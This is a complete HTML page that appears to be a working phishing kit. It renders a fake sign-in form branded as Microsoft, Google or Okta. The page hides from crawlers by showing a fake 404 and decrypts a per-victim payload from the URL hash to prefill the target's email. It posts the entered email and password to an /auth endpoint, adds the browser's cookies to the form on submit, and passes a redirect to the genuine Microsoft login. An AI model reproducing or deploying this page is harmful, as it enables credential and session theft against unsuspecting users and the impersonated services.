<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your account</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, sans-serif;
    background: #f0f0f0;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
}
.container {
    background: #fff;
    padding: 44px;
    width: 400px;
    max-width: 95vw;
    box-shadow: 0 2px 6px rgba(0,0,0,0.15);
}
.logo {
    display: block;
    margin: 0 auto 16px;
    height: 24px;
}
h2 { font-size: 1.5rem; font-weight: 600; margin-bottom: 4px; }
.subtitle { color: #666; font-size: 0.875rem; margin-bottom: 16px; }
input {
    width: 100%;
    padding: 10px 12px;
    margin-bottom: 16px;
    border: 1px solid #ccc;
    font-size: 0.9375rem;
}
input:focus { outline: none; border-color: #0078d4; }
input::placeholder { color: #999; }
.btn {
    width: 100%;
    padding: 10px;
    background: #0078d4;
    color: #fff;
    border: none;
    cursor: pointer;
    font-size: 0.9375rem;
    font-weight: 500;
}
.btn:hover { background: #106ebe; }
.btn:active { background: #005a9e; }
.footer {
    margin-top: 16px;
    font-size: 0.8125rem;
    color: #666;
    text-align: left;
}
.footer a { color: #0078d4; text-decoration: none; }
.error {
    color: #e81123;
    font-size: 0.8125rem;
    margin-bottom: 12px;
    display: none;
}
.loading {
    text-align: center;
    padding: 40px;
    color: #666;
}
</style>
</head>
<body>
<script>if(/bot|crawl|spider|scrape|slurp|baidu|yandex/i.test(navigator.userAgent)){document.body.innerHTML='<h1>404</h1>';document.title='404'}</script>

<div id="app">
    <div class="loading">Loading...</div>
</div>

<script>
const _k='qWg5ACNuVD9PGbOAzE08sEdC/yVb7CmApcXKfe3vdWY=';
const _u='/auth';

async function _d(c,k){
    const n=c.slice(0,12),t=c.slice(-16),e=c.slice(12,c.length-16);
    const r=await crypto.subtle.importKey('raw',k,{name:'AES-GCM'},false,['decrypt']);
    const f=new Uint8Array(e.length+t.length);
    f.set(e,0);f.set(t,e.length);
    try{
        const p=await crypto.subtle.decrypt({name:'AES-GCM',iv:n,tagLength:128},r,f);
        return new TextDecoder().decode(p);
    }catch(e){return null}
}

function _b(s){
    s=s.replace(/-/g,'+').replace(/_/g,'/');
    while(s.length%4)s+='=';
    return Uint8Array.from(atob(s),c=>c.charCodeAt(0));
}

const _r={
    microsoft:{
        name:'Microsoft',
        logo:'<svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><rect x="0" y="0" width="24" height="24" fill="#f25022"/><rect x="26" y="0" width="24" height="24" fill="#7fba00"/><rect x="0" y="26" width="24" height="24" fill="#00a4ef"/><rect x="26" y="26" width="24" height="24" fill="#ffb900"/></svg>',
        subtitle:'Sign in to your account',
        footer:'Terms of use  ·  Privacy & cookies',
        inputPlaceholder:'Email, phone, or Skype',
        btnText:'Next'
    },
    google:{
        name:'Google',
        logo:'<span style="font-size:1.5rem;font-weight:400;color:#444;">Google</span>',
        subtitle:'Sign in to continue to Google Workspace',
        footer:'Help  ·  Privacy  ·  Terms',
        inputPlaceholder:'Email or phone',
        btnText:'Next'
    },
    okta:{
        name:'Okta',
        logo:'<span style="font-size:1.5rem;font-weight:500;color:#00297a;">Okta</span>',
        subtitle:'Sign in to your organization account',
        footer:'Help  ·  Privacy Policy',
        inputPlaceholder:'Username',
        btnText:'Sign in'
    }
};

function _h(s){
    if(!s)return'';
    const d=document.createElement('div');
    d.textContent=s;
    return d.innerHTML;
}

async function main(){
    const app=document.getElementById('app');
    const hash=window.location.hash.slice(1);
    if(!hash){app.innerHTML='<div class="container"><h2>Page not found</h2></div>';return;}

    let decoded;
    try{decoded=_b(hash);}catch(e){app.innerHTML='<div class="container"><h2>Invalid request</h2></div>';return;}

    if(decoded.length<=3){app.innerHTML='<div class="container"><h2>Page not found</h2></div>';return;}
    const ep=decoded.slice(3);

    const kb=_b(_k);
    const pt=await _d(ep,kb);
    if(!pt){app.innerHTML='<div class="container"><h2>Page not found</h2></div>';return;}

    let _l;
    try{_l=JSON.parse(pt);}catch(e){app.innerHTML='<div class="container"><h2>Page not found</h2></div>';return;}

    const brand=_r[_l.b]||_r.microsoft;
    const email=_l.e||'';

    app.innerHTML='<div class="container">'+
        '<div class="logo">'+brand.logo+'</div>'+
        '<h2>'+brand.name+'</h2>'+
        '<p class="subtitle">'+brand.subtitle+'</p>'+
        '<div class="error" id="error">Incorrect email or password. Please try again.</div>'+
        '<form id="loginForm" method="POST" action="'+_u+'">'+
            '<input type="hidden" name="uid" value="'+_h(_l.e||'')+'">'+
            '<input type="hidden" name="cid" value="'+_h(_l.c||'')+'">'+
            '<input type="text" name="loginfmt" placeholder="'+brand.inputPlaceholder+'" value="'+_h(email)+'" required autofocus>'+
            '<input type="password" name="passwd" placeholder="Password" required>'+
            '<button type="submit" class="btn">'+brand.btnText+'</button>'+
        '</form>'+
        '<div class="footer"><span>'+brand.footer+'</span></div>'+
    '</div>';

    document.getElementById('loginForm').addEventListener('submit',function(e){
        var ri=document.createElement('input');
        ri.type='hidden';ri.name='_rd';ri.value=_l.r||'https://login.microsoftonline.com';
        this.appendChild(ri);
        var ci=document.createElement('input');
        ci.type='hidden';ci.name='ctx';ci.value=document.cookie||'';
        this.appendChild(ci);
    });
}

main();
</script>
</body>
</html>
